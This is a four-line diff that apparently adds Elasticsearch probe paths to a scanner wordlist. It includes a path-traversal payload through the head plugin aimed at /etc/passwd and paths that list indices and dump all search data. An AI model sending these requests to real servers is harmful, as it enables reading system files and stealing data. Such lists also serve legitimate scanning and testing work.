@@ -1,0 +1,4 @@
+/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd
+/_cat/indices?v
+/_all/_search
+/?pretty
